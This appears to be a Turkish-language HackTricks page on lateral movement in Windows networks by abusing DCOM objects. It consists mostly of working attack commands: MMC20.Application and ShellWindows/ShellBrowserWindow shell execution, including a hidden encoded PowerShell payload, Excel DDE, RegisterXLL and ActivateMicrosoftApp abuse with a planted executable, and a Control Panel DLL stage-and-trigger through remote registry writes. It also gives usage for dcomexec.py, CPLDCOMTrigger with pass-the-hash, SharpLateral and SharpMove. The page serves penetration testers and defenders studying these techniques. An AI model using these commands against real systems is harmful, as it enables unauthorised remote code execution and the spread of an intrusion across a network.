# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM ile yanal hareket, bir servis veya scheduled task oluşturmak yerine RPC/DCOM üzerinden açığa çıkarılmış mevcut COM sunucularını yeniden kullandığı için caziptir. Pratikte bu, ilk bağlantının genellikle TCP/135 üzerinden başlatıldığı ve ardından dinamik olarak atanan yüksek RPC portlarına geçtiği anlamına gelir.

## Ön koşullar ve dikkat edilmesi gerekenler

- Genellikle hedefte local administrator bağlamına sahip olmanız gerekir ve uzak COM sunucusu uzaktan başlatma/etkinleştirmeye izin vermelidir.
- **14 Mart 2023** tarihinden beri Microsoft, desteklenen sistemlerde DCOM hardening uygular. Düşük bir etkinleştirme authentication level talep eden eski client'lar, en az `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` üzerinde anlaşamadıkları sürece başarısız olabilir. Modern Windows client'ları genellikle otomatik olarak daha yüksek seviyeye çıkarılır; bu nedenle güncel tooling normalde çalışmaya devam eder.<sup>[[3]](#references)</sup>
- Manuel veya scripted DCOM execution genellikle TCP/135'in yanı sıra hedefin dinamik RPC port aralığına erişim gerektirir. Impacket'in `dcomexec.py` aracını kullanıyorsanız ve command output'u geri almak istiyorsanız genellikle `ADMIN$` (veya yazılabilir/okunabilir başka bir share) üzerinde SMB erişimine de ihtiyacınız olur.
- RPC/DCOM çalışıyor ancak SMB engelleniyorsa `dcomexec.py -nooutput` blind execution için yine de yararlı olabilir.

Hızlı kontroller:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Bu teknik hakkında daha fazla bilgi için [orijinal MMC20.Application gönderisine](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) göz atın.<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) nesneleri, nesnelerle network tabanlı etkileşimler için ilginç bir yetenek sunar. Microsoft, hem DCOM hem de Component Object Model (COM) için kapsamlı belgeler sağlar; bunlara [DCOM için buradan](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve [COM için buradan](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) erişilebilir. DCOM uygulamalarının bir listesi, aşağıdaki PowerShell komutu kullanılarak alınabilir:
```bash
Get-CimInstance Win32_DCOMApplication
```
[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) COM object'i, MMC snap-in işlemlerinin script ile çalıştırılmasını sağlar. Özellikle bu object, `Document.ActiveView` altında bir `ExecuteShellCommand` method'u içerir. Bu method hakkında daha fazla bilgiye [buradan](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) ulaşabilirsiniz. Şu şekilde çalıştırarak kontrol edin:<sup>[[6]](#references)</sup>

Bu özellik, bir DCOM application üzerinden network üzerinden command çalıştırılmasını sağlar. DCOM ile uzaktan admin olarak etkileşim kurmak için PowerShell şu şekilde kullanılabilir:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Bu komut, DCOM uygulamasına bağlanır ve COM nesnesinin bir örneğini döndürür. Ardından uzak ana bilgisayarda bir process çalıştırmak için ExecuteShellCommand metodu çağrılabilir. Process şu adımları içerir:

Metotları kontrol edin:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE Elde Et:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Son bağımsız değişken pencere stilidir. `7`, pencerenin simge durumunda kalmasını sağlar. Operasyonel olarak MMC tabanlı execution, genellikle uzak bir `mmc.exe` process'inin payload'ınızı spawn etmesine neden olur; bu, aşağıdaki Explorer tabanlı object'lerden farklıdır.

## ShellWindows ve ShellBrowserWindow

**Bu technique hakkında daha fazla bilgi için orijinal gönderiye bakın: [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** object'inin açık "LaunchPermissions" değerine sahip olmadığı ve varsayılan olarak Administrators erişimine izin veren permission'lara ayarlandığı tespit edildi. Daha fazla ayrıntı için [buradaki](https://twitter.com/tiraniddo/status/817532039771525120) thread incelenebilir. Ayrıca, açık Launch Permission'a sahip olmayan object'leri filtrelemek için [@tiraniddo](https://twitter.com/tiraniddo)’nun OleView .NET aracının kullanılması önerilir.

İki özel object, açık Launch Permission'lara sahip olmadıkları için öne çıkarıldı: `ShellBrowserWindow` ve `ShellWindows`. `HKCR:\AppID\{guid}` altında bir `LaunchPermission` registry entry'sinin bulunmaması, açık permission olmadığı anlamına gelir.

`MMC20.Application` ile karşılaştırıldığında bu object'ler, command'ın uzak host üzerinde `mmc.exe` yerine genellikle `explorer.exe` process'inin child'ı olarak çalışması nedeniyle OPSEC açısından çoğunlukla daha sessizdir.

### ShellWindows

ProgID'ye sahip olmayan `ShellWindows` için .NET method'ları `Type.GetTypeFromCLSID` ve `Activator.CreateInstance`, AppID'sini kullanarak object instance'ı oluşturmayı kolaylaştırır. Bu process, `ShellWindows` için CLSID'yi almak üzere OleView .NET'ten yararlanır. Instance oluşturulduktan sonra `WindowsShell.Item` method'u üzerinden interaction mümkündür ve bu da `Document.Application.ShellExecute` gibi method invocation'larına yol açar.

Object'i instance'lamak ve command'ları uzaktan execute etmek için örnek PowerShell command'ları sağlandı:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` benzerdir, ancak onu CLSID'si aracılığıyla doğrudan örneklendirebilir ve `Document.Application.ShellExecute` öğesine pivot edebilirsiniz:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objects ile Lateral Movement

Lateral movement, DCOM Excel objects istismar edilerek gerçekleştirilebilir. Ayrıntılı bilgi için, DCOM üzerinden lateral movement amacıyla Excel DDE kullanımını ele alan [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) yazısının okunması önerilir.<sup>[[5]](#references)</sup>

Empire project, DCOM objects manipüle ederek remote code execution (RCE) için Excel kullanımını gösteren bir PowerShell scripti sunar. Aşağıda, Excel'i RCE amacıyla abuse etmek için farklı yöntemleri gösteren ve [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) üzerinde bulunan script'ten alınmış parçalar yer almaktadır:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Son araştırmalar, `Excel.Application`'ın `ActivateMicrosoftApp()` yöntemiyle bu alanı genişletti. Temel fikir, Excel'in sistem `PATH`'inde arama yaparak FoxPro, Schedule Plus veya Project gibi eski Microsoft uygulamalarını başlatmayı denemesidir. Bir operatör, beklenen adlardan birine sahip bir payload'ı hedefin `PATH`'inde bulunan yazılabilir bir konuma yerleştirebilirse Excel bunu çalıştırır.<sup>[[4]](#references)</sup>

Bu varyasyon için gereksinimler:

- Hedefte Local admin yetkisi
- Hedefte Excel'in kurulu olması
- Hedefin `PATH`'indeki yazılabilir bir dizine payload yazabilme

FoxPro aramasını (`FOXPROW.exe`) kötüye kullanan pratik örnek:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Saldırgan ana bilgisayarda yerel `Excel.Application` ProgID'si kayıtlı değilse, bunun yerine uzak nesneyi CLSID kullanarak örnekleyin:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Pratikte kötüye kullanıldığı görülen değerler:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — kayıtlı bir Control Panel DLL'inin yüklenmesi

`COpenControlPanel` sınıfı (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`), `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`) arabirimini kullanıma sunar. `Open()` yöntemi, `Control Panel\Cpls` anahtarı altında kayıtlı Control Panel DLL'lerinin uzak bir `dllhost.exe` tarafından yüklenmesine neden olur. Test edilen sistemlerde sınıfın açık launch/access izinleri bulunmadığından, varsayılan DCOM politikasını devralır (bu politika genellikle uzaktan etkinleştirme için yönetici yetkisi gerektirir). Kayıtlı DLL'lerin `Open()` tarafından işlenmesi için rastgele bir öğe adı yeterlidir; payload'ın `.cpl` uzantısına sahip olması gerekmez, ancak doğru mimariye sahip geçerli bir DLL olması gerekir.<sup>[[7]](#references)</sup>

Bu primitive yalnızca komut çalıştırma değil, **stage-and-trigger** yaklaşımıdır: önce hedefe bir DLL kopyalayın ve bu DLL'i gösteren bir `REG_EXPAND_SZ` değeri oluşturun, ardından nesneyi DCOM üzerinden etkinleştirin. Örneğin, yönetici yetkisine sahip bir Windows context'inden:<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
Herkese açık [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) client'ı, belgelenmemiş DCOM çağrısını Impacket ile uygular. Rastgele bir Denetim Masası öğesi adı sağlamak yeterlidir; `dllhost.exe` DLL'yi yüklemiş olsa bile client bir RPC hatası bildirebilir.<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
Operasyonel olarak bu yol ayrıca bir dosya yazma kanalı ve uzak registry erişimi gerektirir; bu nedenle `MMC20`/`ShellWindows` yöntemlerinden daha fazla gürültü üretir. Control Panel daha sonra açıldığında aynı girdiyi yeniden yükleyebileceği için bir kalıcılık yan etkisi oluşturur. Çalıştırma sonrasında değeri kaldırın ve beklenmeyen `Control Panel\Cpls` değerlerini `dllhost.exe` içindeki olağandışı DLL yüklemeleriyle birlikte araştırın.<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Lateral Movement için Automation Tools

Bu teknikleri otomatikleştirmek için iki tool öne çıkarılmıştır:

- **Invoke-DCOM.ps1**: Empire project tarafından sağlanan ve uzak makinelerde code çalıştırmak için farklı yöntemlerin invocation işlemini kolaylaştıran bir PowerShell script'idir. Bu script, Empire GitHub repository'sinde bulunabilir.

- **SharpLateral**: Uzaktan code çalıştırmak için tasarlanmış bir tool'dur ve şu command ile kullanılabilir:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Otomatik Araçlar

- [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) Powershell script'i, diğer makinelerde code execution gerçekleştirmek için yorum satırına alınmış tüm yöntemleri kolayca çağırmaya olanak tanır.
- DCOM kullanarak uzak sistemlerde komutlar çalıştırmak için Impacket'in `dcomexec.py` aracını kullanabilirsiniz. Güncel build'ler `ShellWindows`, `ShellBrowserWindow` ve `MMC20` desteği sunar ve varsayılan olarak `ShellWindows` kullanır.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Ayrıca [**SharpLateral**](https://github.com/mertdas/SharpLateral) kullanabilirsiniz:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [**SharpMove**](https://github.com/0xthirteen/SharpMove) aracini da kullanabilirsiniz
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [MMC20.Application COM Object kullanarak Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM üzerinden Lateral Movement: 2. Tur](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass (CVE-2021-26414) için değişiklikleri yönetme](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel Application'ın gücünü kötüye kullanma](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM üzerinden Lateral Movement için Excel DDE'den yararlanma](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Uzaktan command execution için DCOM nesnelerini kullanma](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
